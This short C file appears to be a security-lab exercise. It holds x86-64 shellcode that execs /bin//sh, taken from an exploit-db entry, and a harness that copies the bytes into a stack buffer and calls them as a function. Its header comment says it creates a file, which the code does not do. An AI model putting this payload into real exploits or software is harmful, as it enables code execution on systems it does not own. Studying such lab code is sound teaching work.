/*
https://stackoverflow.com/questions/59734421/what-does-void-buf-mean
https://www.exploit-db.com/exploits/47008
*/

/* call_shellcode.c  */

/*A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>



unsigned char code[]= 
                  "\x48\x31\xf6\x56\x48\xbf"
		  "\x2f\x62\x69\x6e\x2f"
		  "\x2f\x73\x68\x57\x54"
		  "\x5f\xb0\x3b\x99\x0f\x05";

int main(int argc, char **argv)
{
   char buf[sizeof(code)];
   strcpy(buf, code);
   ((void(*)( ))buf)( ); //That "character array" is actually an array of machine code. When you cast the array to a void (*)() and call it, it runs the machine code inside of the array. 
}
